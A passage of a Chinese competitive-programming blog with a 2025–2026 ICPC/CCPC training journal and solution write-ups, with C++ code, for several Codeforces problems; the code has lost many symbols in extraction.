已经通过切割，将这个图形大致分成三个部分：中心的柱体、周围直线边和圆角。其中中心柱体和直线边都很好算，简单的体积公式就能算出来，但是，在计算圆角的体积的时候出现了严重问题。 Sky 和 Scy 当时简单地将圆角又切成了上面两个立体图形，一个标准圆柱体和一个半圆柱体，想当然地认为圆角体积和就是： V_1 = 2 \\pi R_2^2 R_3 + \\pi^2 R_2 R_3^2导致赛时最后十分钟连样例都没过，而且就差一点。那么这个式子错在哪呢，难道圆角不能这么切割吗？还真是。 赛后 Sky 用积分重新算了一遍，先记： R = R_2 + \\sqrt{R_3^2 - z^2} \\\\\\ f(z) = S = \\pi R^2然后体积就是 \\begin{align} V_2 &= 2 \\int_0^{R_3} f(z) dz \\\\\\ &= 2 \\int_0^{R_3} (\\pi R_2^2 + \\pi R_3^2 - \\pi z^2 + 2 \\pi R_2 \\sqrt{R_3^2 - z^2}) dz \\\\\\ &= 2 \\pi R_2^2 R_3 + \\pi^2 R_2 R_3^2 + \\frac{4}{3} \\pi R_3^3 \\end{align}会发现 $V_2$ 比上面的 $V_1$ 多了一个 $\\frac{4}{3} \\pi R_3^3$，即一个半径为 $R_3$ 的球的体积，就是鸟本身，到底哪里多出来了一只鸟？？ 其实就是切割圆角的问题，我们将圆柱周围一圈展开的时候，是不能直接用右边那个半圆柱的体积去算的，因为这个半圆柱是压缩过的，我们要考虑内半径和外半径长度不同，也就是说周围这一圈是不能被展开的，要么用积分算，要么就展开后再把球体的体积加上。 赛后加了鸟的体积之后一发通过。 2025.09.20 第十一届中国大学生程序设计竞赛网络预选赛（CCPC Online 2025）E 题发现是签到，但是 Sky 一开始有点急，报了一个错误的答案，喜提 20 min 罚时。冷静了一下发现答案应该是 $2(m - \\lfloor\\frac{n}{2}\\rfloor) - 1$，重新提交后通过。 A 题 Sky 和 Zlw 开了。开局先看错题以为正方形需要横平竖直，看完样例突然傻眼，我一开始认为可以枚举弦图中间的小正方形，然后做八次区间加，复杂度根号但是常数巨大且不好写。然后 Sky 通过约束 $4$ 个顶点的位置写出了不等式，可以枚举其中一个变量然后直接算另一个变量的区间即可，复杂度根号，可以通过。 我想到一个 G 的做法，于是上机尝试写，写到一半突然发现如果一个数有 $\\frac{n}{2}$ 次，然后询问其它所有数，会直接导致我卡成 $n^2$。于是开始进一步手玩 K，试了几个发现倒序输出就是最优的，然后此时答案是 $\\frac{n(n + 1)}{2}$，第一 WA 由于数错了导致，重新修正以后通过。 Zlw 来看 G 了，想了一下 Scy 的做法虽然假了，但其实他的做法再根号分治一下就真了。思考后用了传统序列分块，块之间的贡献直接算，块内 $O(B^2)$ 预处理，总复杂度 $O(n^{1.5})$。 C 题 Sky 先和讨论 Scy 然后提出了一个神奇的贪心。Sky 在转述的时候用了一个比较形象的例子，但 Zlw 认为有点误导题目意思（甩锅）。后来发现本质上是完全图最小生成树，尝试想 B 算法。结合 Sky 的思路本质上是要找连通块外的最小边，与 B 算法极为类似，由于没写过 B 算法，出于正确性的考量，启发式合并存储了每个连通块内的点，用块内点消除全局 multiset 的贡献后寻找最近点，然后并查集合并，迭代了 $O(\\log n)$ 层，交上去发现过了。 之后我发现 M 是一个超绝构造就开始想。赛时没有考虑到一些问题导致假掉一直 WA，最后也没过。赛后修补了 bug 但发现需要 $ 200$ 次，遂倒闭。 首先先对 $X$ 求前缀和，每次选取每块的第 $i$ 位去加上前一位的值。但有些位置是不需要的，得把影响消除，于是花费额外的 $2 \\times 32 = 64$ 次借助 $Y$ 做乘法后做减法。之后是块之间的合并，但是仍然要考虑到多余的影响，于是 $Y$ 先做前缀 $\\max$，之后再按照之前的方法先加再消除影响。总共用了 $221$ 次。发现操作有冗余的地方，但是赛后想了很久都没想出来。 看了一个 Hint 之后直接顿悟。具体如下： 先花 $32$ 次求出每个块内的前缀和（不管 $Y$ 数组），然后花 $32$ 次维护块之间的前缀和。即 $x_i = \\sum \\limits_{j=0}^i x_j$。 花费 $32$ 次做乘法 $y_i = x_i \\times y_i$，非零位也就变成了无用的位置的前缀和。 与 $1$ 类似，把前缀和改为前缀 $\\max$，即 $y_i = \\max \\limits_{j=0}^i \\{y_j\\}$。 最后花费 $32$ 次做减法消除影响，$x_i = x_i - y_i$。 好吧确实是个脑瓜题，题目看了很久才懂，然后似乎只有一种解法（？），也就是只有脑电波对上了才可能做出来。然而我并没有脑瓜，也就只能在赛时疯狂 WA 了 qwq。 D 是 Zlw 想出来的，$04:57$ 才通过非常极限。想了很久与子序列方案数相关的做法，但是无一例外的会算重，难以维护左端点的合法个数。后来发现随着 $r$ 的增加，前面可行的 $l$ 在后面可行的 $r$ 中一直可行，具有单调性。所以可以直接维护 $dp_{i,j}$ 表示考虑 $[1,i]$，匹配到第 $j$ 段且恰好第 $j$ 段末尾在 $i$ 时，最大的可行的 $l$ 在哪。对于首尾无星号，需要维护前缀可行点数；对于单一前面（在后面就翻转）的星号，可以直接产生 $dp_{i,tot}$ 的贡献；对于前后都有星号，还需要再对 $dp$ 数组做一次后缀 $\\max$，最终极限过题。但是赛后被 Scy 叉了，原因是没特判无星号的情况，而恰好数据没有无星号的情况。 9-10 月训练懒得一一写了，就记录一下情况吧。 2025.09.11 The 2nd Universal Cup. Stage 12: Hefei solved 4/12. 2025.09.25 The 2021 ICPC Southeastern European Regional Programming Contest (SEERC 2021) solved 8/14. 2025.10.02 The 2022 ICPC Asia Hong Kong Regional Contest solved 6/12. 2025.10.09 The 2024 ICPC Asia Hong Kong Regional Contest solved 5/13. 2025.10.13 The 2018 ICPC Asia Qingdao Regional Contest solved 7/13. 2025.10.17 The 2024 ICPC Asia Shenyang Regional Contest solved 3/13. 2025.10.19 The 2024 CCPC Shandong Invitational Contest and Provincial Collegiate Programming Contest solved 8/13. 2025.10.23 The 2025 ICPC Asia Xi’an Regional Contest solved 5/13. 【补题】 B 题目大意：给定三种颜色的球排成一行，如果相邻两个球的颜色都不一样，则认为这一行是“漂亮的”。现在给定一个串，可以选择 $l$ 和 $r$，使得区间 $[l,r]$ 的所有球随便换位置，能否使得其变成“漂亮的”，求最短区间的 $l$ 和 $r$ 以及变成的“漂亮的”区间的解。 看到 $n \\leq 2 \\cdot 10^6$，和 $l, r$，考虑能否固定一个 $l$ 然后二分 $r$。通过观察可知，假设要随意调整一个固定的区间 $[l, r]$，且 $L=l-1, R=r+1$（区间的左右边），假设最多的颜色数量为 $A$，其次为 $B$ 和 $C$，可以分成六种情况： $A = B = C$，肯定有解 $A = B C$，如果 $L$ 和 $R$ 颜色相同且等于 $B$ 的颜色，交换 $AB$ 并做下面的步骤 $A B C$ 且 $A B+C+1$，无解 $A B C$ 且 $A = B+C+1$，$L$ 和 $R$ 的颜色要都与 $A$ 的不同才有解，否则无解 $A B C$ 且 $A = B+C$，只要 $L$ 和 $R$ 的颜色有一个与 $A$ 的不同即可，否则无解 $A B C$ 且 $A B+C$，肯定有解 这样就可以 $O(1)$ check 啦！然后得到最小答案区间 $[l, r]$ 之后还要找到专这样的区间，考虑枚举这个区间每一位可以放什么，比如枚举 $i$ 放 $A$ 后，再用上面的二分 check $[i+1, r]$ 是否合法即可。 这题比较有意思的是其单调性，我们枚举 $l$ 的范围是左边第一个到第一次出现颜色重复的位置，二分 $r$ 的范围是右边第一次出现重复的位置到右边最后一个，这样找出来的“美丽的”区间，其加上左右本身就是“美丽的”部分，还是一个“美丽的”区间，而其稍微缩小一点就会导致“不美丽”，想到这个单调性之后剩下的 check 和还原就比较顺了，分类讨论和模拟稍微有点小细节。 K 考虑标题”killing bits”，可以发现 $a_i \\rightarrow b_i$ 的必要条件之一是 $b_i\\subset a_i$。然后需要通过操作消除多余的位数。 然后还需要考虑强制保留 $b_i$ 存在的位。因此与 $b_i$ 匹配的排列中的元素 $p_i$ 必须满足 $b_i\\subset p_i$。 优化一下第二个条件的建图跑匹配就过了。暂时不会证如何满足第一个条件。 M 赛时是观察到 $1$ 的重要性，以及 $n$ 为奇数时全 $1$ 序列的不合法性。可是在一些其它情况中，没有想清楚到底哪些序列会因 $1$ 的双消而留下最后一个数，导致序列不合法。 这个题的策略是尽可能的消成 $1$ 并放置到两侧，后来打了一个暴力表，看哪些情况是不合法的。一看表就发现规律了。 当序列中的数，满足下列情况中的一条即为不合法序列： $n$ 为奇数且全为 $1$ 序列中的数 $a_i$ 均满足 $a_i \\ge n \\vee (a_i = 1 \\land 1 i n \\land exists i \\in [2,n - 1], \\text{s.t.} a_{i - 1} = a_i = 1)$ 发现这个结论以后直接写 DP 记录不合法序列的个数即可，一发通过。 2025.10.26 The 2025 ICPC Asia Chengdu Regional Contest solved 6/13. 【补题】 D 是个码量大的模拟记搜 DP，可能因为脑子不太清醒，反正赛时一个多小时没调过。赛后发现有个地方少敲了变量累加，以及忘记斯诺克最后要按顺序击打彩球了。 K CKM 似乎是一个难度的，由于赛时被 A,D 两题恶心了，所以没来得及做，有点点可惜，不过实操下来思路简单，代码难写。 题意：给定 $n$ 个定长 $L$ 的线段，可以移动恰好一个线段到任意非负位置，求恰好有 $k$ 个线段的位置最多有多少个。 考虑枚举移动的线段，分为两种形式：移动到与之前完全不交的区间、移动到与之前相交的区间。 考虑每次移动只影响区间内部 $k-1,k,k+1$ 的位置，前缀和维护是可行的，尝试将一些变量分离。 第一种情况可以发现区间长度为定值，所以可以只在左端点记录答案，ST 表查询区间 $\\max$ 即可。 第二种情况非常恶心，反正各推了一个有八项的式子，兜兜转转能够分别写成 $t^{(1)}_{l-1}-t^{(1)}_{l-x},t^{(2)}_{l+x}-t^{(2)}_{l-1}$ 的形式，$t$ 同样是用左端点存区间答案的形式，然后最终 ST 表查某个区间的 $\\max$。需要注意 $x$ 的值域以及 $t^{(1)}$ 和 $t^{(2)}$ 会有些许不同。 2025.11.05 The 2022 ICPC Asia Nanjing Regional Contest solved 7/13. 出征 XCPC2025.11.01-11.02 ICPC 武汉站2025.11.08-11.09 ICPC 南京站2025.11.29-11.30 CCPC 重庆站两个佬都有自己的博客😭 Zlw 佬的游记 Sky 佬的游记 出线 EC Final (?) 2025.11.23 上海站的结束意味着大陆所有赛站的结束，看了俊杰的 EC Final 出线预测，似乎拿到了正式的 228 支正式队伍名额的一个（看预测武汉和南京的都可以出线，非常意外，本来以为要靠学校的 WF 奖励名额了）。 2025.12.13 官网确定出线!好耶可以公费回家! 备战 EC 2025.12.20 The 2025 ICPC Asia Taichung Regional Programming Contest 台中站简单题似乎很多，前一个小时切了 5 题。不过有点可惜，最后一个题赛后 5 分钟通过。solved 8/14. 2026.01.02 The 2025 ICPC North America East Central Regional Contest (ECNA 2025) 简单场。我们学校两只队伍去争夺奖励名额了，所以我们也跟着训练了一下。 2026.01.07 The 2021 ICPC Asia East Continent Final Contest (EC-Final 2021) 这场我是战犯，读错题给队友卡了一小时，然后理解错题假了一小时，最后计算几何还把判断点是否在直线一侧给写错了。（由于最后几秒 QOJ 卡了，没交上去，但是通过了，所以……） solved 6/14. 2026.01.09 The 2022 ICPC Asia East Continent Final Contest (EC-Final 2022) 被交互和构造卡了，有简单题没发现（ solved 4/14. 2026.01.11 The 2024 ICPC Europe Championship 被签到 B 疯狂卡的一天，看到最大化最小值就先入为主的想要二分，检验合法性想了一万年。最后发现直接枚举分界点，然后求解答案即可。solved 5/11. 2026.01.14 The 2024 ICPC North America Championship 一时口胡一时爽 一直口胡一直爽。solved 7/13. 2026.01.18 The 2025 ICPC Europe Championship 构造场，红温了。solved 4/11. 2026.01.21 The 2023 ICPC Asia East Continent Final Contest (EC-Final 2023) 铜牌前部位置，最后交互没出，但是第一次 0 dirt 率！ solved 5/13. 2026.01.25 The 2024 ICPC Asia East Continent Final Contest (EC-Final 2024) 应该是最后一训，但我又一次读错题了！直接变成不可做题，硬控队友四小时！solved 3/13.","categories":["Journal"]},{"title":"题解：CF2106G Baudelaire","path":"/2025/04/25/CF2106G/","content":"本文做法可能存在错误，详见 讨论。 由 G1 可知，只要能确定根节点的位置，就能够用 $n$ 次操作获得答案。因此，本题就需要在不超过 $200$ 次的询问中获得根节点的位置。 设当前点为 $u$，与 $u$ 相邻的点组成集合 $S$。若当前询问集合 $Q$ 满足，$Q \\subset S$，则可以进行操作： 用 $1$ 操作询问 $Q$，获得答案 $sx$。 进行 $2$ 操作，翻转 $u$。 再次用 $1$ 操作询问 $Q$，获得答案 $sy$。 可以发现，若 $|sx - sy| = 2 \\times |Q|$，则 $Q$ 中不存在 $u$ 的父亲节点。 利用这个性质，可以先找到以 $u$ 为子树的重心 $c$，然后将 $c$ 所有相邻的点加入集合中，通过二分法找到哪一个子结点与根距离最近。具体来说，分为以下情况： $c$ 已经不存在相邻点—此时 $c$ 即为所求。 询问 $c$ 所有相邻的点且符合以上条件— $c$ 为所求。 剩下的情况就进行二分操作。 综上所述，至多需要约 $n + 3 \\times \\lceil\\log (n)\\rceil$ 次询问之后就能找到根节点。最后进行一次 dfs 并询问即可求出答案。 #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n;int main () t = read (); while (t--) n = read (); int tot = 0,c = 0; vector int ans (n + 1),sz (n + 1),w (n + 1),vis (n + 1,0); vector vector int ve (n + 1); for (int i = 1;i n;++i) int u = read (),v = read (); ve[u].push_back (v);ve[v].push_back (u); auto query1 = [] (vector int p) - int printf (? 1 %d ,p.size ()); for (auto v : p) printf (%d ,v); puts ();fflush (stdout); return read (); ; auto query2 = [] (int x) - void printf (? 2 %d ,x);fflush (stdout);; auto dfs1 = [] (auto self,int u,int fa) - void sz[u] = 1; for (auto v : ve[u]) if (v == fa || vis[v]) continue; self (self,v,u); sz[u] += sz[v]; ; auto dfs2 = [] (auto self,int u,int fa,int pre) - void ans[u] = query1 (u) - pre; for (auto v : ve[u]) if (v == fa) continue; self (self,v,u,pre + ans[u]); ; auto cen = [] (auto self,int u,int fa) - void sz[u] = 1;w[u] = 0; for (auto v : ve[u]) if (v == fa || vis[v]) continue; self (self,v,u); sz[u] += sz[v]; w[u] = max (w[u],sz[v]); w[u] = max (w[u],tot - sz[u]); if (w[u] = tot / 2) c = u; ; auto ask = [] (vector int p) - pii int sx = query1 (p);query2 (c);int sy = query1 (p); return sx,sy; ; auto solve = [] (auto self,int u) - int // 找 rt dfs1 (dfs1,u,u);tot = sz[u]; cen (cen,u,u);vis[c] = 1; vector int g; for (auto v : ve[c]) if (!vis[v]) g.push_back (v); if (g.empty ()) return c;//已经找到 rt int l = 0,r = g.size () - 1,res = 0; auto [sx,sy] = ask (g); if (abs (sx - sy) == 2 * g.size ()) return c;//重心即为 rt while (l = r) int mid = (l + r) 1; vector int tmp; for (int i = 0;i = mid;++i) tmp.push_back (g[i]); auto [sx,sy] = ask (tmp); if (abs (sx - sy) == 2 * tmp.size ()) l = mid + 1; else res = mid,r = mid - 1; return self (self,g[res]); ; dfs2 (dfs2,solve (solve,1),0,0); printf (! ); for (int i = 1;i = n;++i) printf (%d ,ans[i]); puts ();fflush (stdout); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2096F Wonderful Impostors","path":"/2025/04/22/CF2096F/","content":"设 $f_r$ 表示最小的左端点 $l$，使得 $[l,r]$ 区间的询问均可合法。在处理询问时，转化为判断是否 $f_r \\le l$ 合法即可。 首先考虑如何求出 $f_i$。尝试使用双指针，当前 $[l,r]$ 区间的询问均合法，当加入 $r’=r + 1$ 后，若区间不合法，则进行 $l’ = l + 1$ 操作直到 $[l’,r’]$ 合法。 那么现在的难点便是如何检验区间的合法性。 定义标记数组 $\\{v_1,v_2,\\cdots,v_n\\}$，初始均为 $0$。当 $x_i = 0$ 时，进行区间加 $1$ 操作。当 $x_i = 1$ 时，若某一时刻 $\\min\\{v_{a_i},v_{a_{i + 1}},\\cdots,v_{b_i}\\} 0$，则说明该时刻的情况不合法。当 $x_i = 1$ 时，我们可以直接通过线段树维护区间最小值来判断合法性。但是最棘手的部分是当加入 $x_i = 0$ 的操作时，会影响到之前 $x_i = 1$ 的部分。 令 $p_i$ 表示所有 $x_j = 1$ 且 $b_j = p_i$ 的操作所对应的 $a_j$ 的最大值，即 $p_i = \\max\\limits_{x_j = 1,b_j = i} \\{a_j\\}$。当增加一个 $x_i = 0$ 的操作时，设 $[x,y]$ 表示在加入 $[a_i,b_i]$ 区间后，满足 $\\min\\{v_{x},v_{a_{i + 1}},\\cdots,v_{y}\\} 0$ 且 $[a_i,b_i] \\subseteq [x,y]$ 的最大区间，若 $\\max \\{p_x,p_{x + 1},\\cdots,p_y\\} x$，即可说明该操作的合法性。考虑维护 $p_i$，线段树维护最大值即可。当然，由于涉及 $a_i$ 的删减，用 multiset 处理单点，后上传到线段树上即可实现。 最后考虑如何快速求出加入 $[a_i,b_i]$ 后的扩展区间 $[x,y]$。线段树与二分的结合显然可以实现，但是总时间复杂度为 $O(n \\log^2 n)$，亲测会超时，故考虑线段树二分。注意，应该找到 $a_i$ 从左往右数第一个 $v_i$ 为 $0$，$b_i$ 右侧第一个为 $v_i$ 为 $0$ 的位置。 因此，最后的时间复杂度为 $O(n \\log n)$。 #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct node int ty,l,r; a[MAX];int t,n,m,q,f[MAX];multiset int s[MAX];class seg1 int n;vector int tree,tmp; void pushdown (int cur) if (!tmp[cur]) return ; tree[cur 1] += tmp[cur];tree[cur 1 | 1] += tmp[cur]; tmp[cur 1] += tmp[cur];tmp[cur 1 | 1] += tmp[cur]; tmp[cur] = 0; void pushup (int cur) tree[cur] = min (tree[cur 1],tree[cur 1 | 1]); public : seg1 (int n) : n (n),tree (4 * n + 1,0),tmp (4 * n + 1,0) void modify (int cur,int l,int r,int x,int y,int v) if (x = l y = r) tree[cur] += v;tmp[cur] += v; return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify (cur 1,l,mid,x,y,v); if (y mid) modify (cur 1 | 1,mid + 1,r,x,y,v); pushup (cur); int query (int cur,int l,int r,int x,int y) if (x = l y = r) return tree[cur]; int mid = (l + r) 1,res = INF; pushdown (cur); if (x = mid) res = min (res,query (cur 1,l,mid,x,y)); if (y mid) res = min (res,query (cur 1 | 1,mid + 1,r,x,y)); return res; int search_L (int cur,int l,int r,int x,int y) if (l == r) return !tree[cur] ? l : n + 1; pushdown (cur); if (x = l y = r) int mid = (l + r) 1; if (!tree[cur 1]) return search_L (cur 1,l,mid,x,y); else return search_L (cur 1 | 1,mid + 1,r,x,y); else int mid = (l + r) 1,res = n + 1; if (x = mid) res = search_L (cur 1,l,mid,x,y); if (res == n + 1 y mid) res = search_L (cur 1 | 1,mid + 1,r,x,y); return res; int search_R (int cur,int l,int r,int x,int y) if (l == r) return !tree[cur] ? l : 0; pushdown (cur); if (x = l y = r) int mid = (l + r) 1; if (!tree[cur 1 | 1]) return search_R (cur 1 | 1,mid + 1,r,x,y); else return search_R (cur 1,l,mid,x,y); else int mid = (l + r) 1,res = 0; if (y mid) res = search_R (cur 1 | 1,mid + 1,r,x,y); if (!res x = mid) res = search_R (cur 1,l,mid,x,y); return res; ;class seg2 int n;vector int tree; void pushup (int cur) tree[cur] = max (tree[cur 1],tree[cur 1 | 1]); public : seg2 (int n) : n (n),tree (4 * n + 1,0) for (int i = 1;i = n;++i) s[i].clear (); void modify (int cur,int l,int r,int x,int v,int ty) if (l == r) if (!ty) s[l].insert (v); else s[l].erase (s[l].find (v)); if (!s[l].empty ()) tree[cur] = *(--s[l].end ()); else tree[cur] = 0; return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,v,ty); else modify (cur 1 | 1,mid + 1,r,x,v,ty); pushup (cur); int query (int cur,int l,int r,int x,int y) if (x = l y = r) return tree[cur]; int mid = (l + r) 1,res = 0; if (x = mid) res = max (res,query (cur 1,l,mid,x,y)); if (y mid) res = max (res,query (cur 1 | 1,mid + 1,r,x,y)); return res; ;int main () t = read (); while (t--) n = read ();m = read (); seg1 tr1 (n + 1);seg2 tr2 (n + 1); for (int i = 1;i = m;++i) a[i].ty = read (),a[i].l = read (),a[i].r = read (); int l = 1,r = 0; while (r m) ++r; if (!a[r].ty) tr1.modify (1,1,n,a[r].l,a[r].r,1); else tr2.modify (1,1,n,a[r].r,a[r].l,0); while (l = r) if (!a[r].ty) int dl = tr1.search_R (1,1,n,1,a[r].l) + 1,dr = tr1.search_L (1,1,n,a[r].r,n) - 1; if (tr2.query (1,1,n,dl,dr) dl) break; else if (!tr1.query (1,1,n,a[r].l,a[r].r)) break; if (!a[l].ty) tr1.modify (1,1,n,a[l].l,a[l].r,-1); else tr2.modify (1,1,n,a[l].r,a[l].l,1); ++l; f[r] = l; q = read (); while (q--) int l = read (),r = read (); puts (f[r] = l ? YES : NO); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF886E Maximum Element","path":"/2025/04/18/CF886E/","content":"正难则反，考虑长度为 $i$ 的排列得到正确的结果的方案数。 设 $dp_i$ 表示长度为 $i$ 的排列直到循环完也没有提前 return 的方案数。考虑 $i$ 所放置的位置，由于不会提前 return，也就说明该数字所在的位置为 $[i - k + 1,i]$ 的范围中。因此可以枚举 $i$ 的位置为 $j$，则相当于将 $[1,i]$ 的区间分为 $[1,j - 1],[j],[j + 1,i]$。 第一段为 $i - 1$ 个数字中选择 $j - 1$ 个，也就是 $\\binom{i-1}{j-1}$，然后合法的方案数为 $dp_{j - 1}$；第二段放最大值 $i$，第三段还剩下 $i - j$ 个数字，随意放置，也就是 $(i - j)!$。虽然说 $dp_i$ 的状态考虑的是排列，但是显然我们只需要考虑数字之间的相对大小，因此第一段的方案数是合理的。可以得到以下转移： dp_i=\\sum_{j=i-k+1}^i \\binom{i-1}{j-1}\\times dp_{j-1}\\times (i-j)!尝试进行化简，可以得到： dp_i = \\sum_{j=i-k+1}^i \\frac{(i - 1)!}{(j - 1)! \\times ((i - 1) - (j - 1))!}\\times dp_{j-1}\\times (i-j)! \\\\ = \\sum_{j=i-k+1}^i\\frac{(i - 1)!}{(j - 1)!} \\times dp_{j - 1} \\\\ = (i - 1)! \\times \\sum_{j=i-k}^{i - 1} \\frac{dp_j}{j!}维护一段长度为 $k$ 的 $\\frac{dp_i}{i!}$ 的和即可 $O(n)$ 求出 $dp_i$。 最后再考虑答案。若最后求得的答案是正确的，我们只需要枚举 $n$ 所在的位置即可。因此总共合法的方案数为： ans = \\sum_{i = 1}^n \\binom {n - 1}{i - 1} \\times dp_{i - 1} \\times (n - i)!最后的答案就是 $n!-ans$。代码如下： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,k;ll tot,sum,dp[MAX],f[MAX],inv[MAX];ll qpow (ll x,ll y) ll res = 1; while (y) if (y 1) res = res * x % MOD; x = x * x % MOD; y = 1; return res;int main () n = read ();k = read (); inv[0] = f[0] = 1; for (int i = 1;i = n;++i) f[i] = f[i - 1] * i % MOD; inv[n] = qpow (f[n],MOD - 2); for (int i = n - 1;i;--i) inv[i] = inv[i + 1] * (i + 1) % MOD; dp[0] = sum = 1; for (int i = 1;i = n;++i) dp[i] = f[i - 1] * sum % MOD; sum = (sum + dp[i] * inv[i] % MOD) % MOD; if (i = k) sum = (sum - dp[i - k] * inv[i - k] % MOD + MOD) % MOD; for (int i = 1;i = n;++i) tot = (tot + dp[i - 1] * f[n - 1] % MOD * inv[i - 1] % MOD) % MOD; printf (%lld ,(f[n] - tot + MOD) % MOD); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2092D Mishkin Energizer","path":"/2025/04/02/CF2092D/","content":"不难发现形如 LIT 的串是万能的。证明如下： 可以多生成一个 L 变为 LILT。 可以多生成一个 T 变为 LTIT。 想要多生成一个 I，先选择上面两个的其中一个操作，然后同理即可。 进一步地，只要存在相邻两个字母不同，就可以花费一个操作变为万能串。每一步最多操作两次即可向着目标前进，故总次数不会超过 $2n$。 由于还需要记录路径，当 LIT 变为 ILT 后，需要注意万能串最左侧的位置会增加 $1$。直接用 while 配套着 swap 需求的写法最为简洁。 #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 105;const int MOD = 1e9 + 7;inline int read ();int t,n,tot,ok,cnt[200];char s[MAX];vector int ans;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); tot = L ^ I ^ T; t = read (); while (t--) n = read ();scanf (%s,s + 1); ok = cnt[L] = cnt[I] = cnt[T] = 0; ans.clear (); for (int i = 1;i = n;++i) if (i 1 s[i] != s[i - 1]) ok = 1; ++cnt[s[i]]; if (!ok) puts (-1);continue; //无法构造出万能串，肯定是无解 if (cnt[L] == cnt[I] cnt[I] == cnt[T]) puts (0);continue;//无需操作就直接特判 for (int i = 2;i = n;++i) if (s[i] == s[i - 1]) continue;//由 AB - ACB 构造万能串 int x = s[i - 1],z = s[i],y = tot ^ (x ^ z),p = i - 1; ans.push_back (p);++cnt[y]; while (cnt[x] != cnt[y] || cnt[x] != cnt[z] || cnt[y] != cnt[z]) if (cnt[x] cnt[z]) ans.push_back (p),++cnt[z],swap (y,z); else ans.push_back (++p),++cnt[x],swap (x,y);//万能串最左侧的位置右移 break; printf (%d ,ans.size ()); for (auto v : ans) printf (%d ,v); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF98E Help Shrek and Donkey","path":"/2025/03/26/CF98E/","content":"首先，在最优策略的条件下，在没有多余信息的情况时，先手不会主动去猜测，只会不断地尝试询问。 接下来我们尝试列出以下表格。其中，上方是先手，左侧是后手。先手询问一张自己手中没有的牌，称之为问；询问一张自己手中有的牌，称之为诈： 先后手 问（自己没有的牌） 诈（自己有的牌） 相信先手 $\\texttt{A}$ $\\texttt{B}$ 不相信先手 $\\texttt{C}$ $\\texttt{D}$ 设 $f_{n,m}$ 表示先手有 $n$ 张，后手有 $m$ 张牌时，先手获胜的概率。对四种情况进行详细地分析： $\\texttt{Case A}$ 有 $\\frac{1}{m + 1}$ 的概率问到桌上的那张牌。由于后手选择相信，后手也就知晓了桌上的牌，因此下一次可以直接猜测这张牌而获胜。 有 $\\frac{m}{m + 1}$ 的概率问到后手手中的牌。后手失去一张牌且无多余信息获得。 因此该种情况的收益为 $\\frac{1}{m + 1} \\times 0 + \\frac{m}{m + 1}(1-f_{m - 1,n})$。 $\\texttt{Case B}$ 后手认为这张牌是桌上的牌，因此后手无法获胜，收益为 $1$。 $\\texttt{Case C}$ 有 $\\frac{1}{m + 1}$ 的概率问到桌上的那张牌。由于后手选择不相信，相当于后手认为这张牌是先手的，因此先手胜。 有 $\\frac{m}{m + 1}$ 的概率问到后手手中的牌。后手失去一张牌且无多余信息获得。 因此该种情况的收益为 $\\frac{1}{m + 1} \\times 1 + \\frac{m}{m + 1}(1-f_{m - 1,n}) = 1 - \\frac{m}{m + 1}f_{m - 1,n}$。 $\\texttt{Case D}$ 相当于后手知晓了先手的一张牌，先手无多余信息获得，收益为 $1 - f_{m,n - 1}$。 四种情况均已知晓后我们就需要找到纳什均衡，换句话说，就是找到一个概率 $p$ 使得每个人的选择都让对方无法猜透，更进一步来说，就是期望价值相等（如果画图，可以得到两条线存在非坐标轴处的交点）。因此可列出方程： pA + (1 - p)B = pC + (1 - p)D \\\\ p(A - B - C + D) = D - B \\\\ p = \\dfrac{B - D}{B + C - A - D}代码用记忆化即可，注意边界情况： long double dfs (int x,int y) if (dp[x][y]) return dp[x][y]; if (!x) return dp[x][y] = 1.0 / (y + 1); if (!y) return dp[x][y] = 1.0; long double A = 1.0 * y / (y + 1) * (1 - dfs (y - 1,x)),B = 1.0,C = 1.0 - 1.0 * y / (y + 1) * dfs (y - 1,x),D = 1 - dfs (y,x - 1); long double p = (B - D) / (B + C - A - D); return dp[x][y] = p * A + (1 - p) * B;","categories":["Solution"]},{"title":"题解：CF2075E XOR Matrix","path":"/2025/03/20/CF2075E/","content":"注意到一个数组内的数的种类不可能大于 $2$，于是大力分类讨论。 $a,b$ 数组内的数均只有一种，此时生成的异或矩阵只有一种取值，满足题目条件，方案数为 $(A + 1)(B + 1)$。 $a$ 数组内的数有两种，$b$ 中只有一种。此时生成的异或矩阵有两种取值，仍然满足题目条件。可以给 $a$ 数组内的数任意选择两种，并枚举其中一种数的个数。用二项式定理进一步化简，最终可得到方案数为 (B + 1) \\times \\binom {A + 1}{2} \\sum \\limits_{i = 1}^{n - 1} \\binom {n}{i} \\\\ =\\dfrac{1}{2}{(B + 1)(A + 1)A}\\sum \\limits_{i = 1}^{n - 1} \\binom {n}{i} \\\\ =\\dfrac{1}{2}{(B + 1)(A + 1)A}(2^n - 2) $b$ 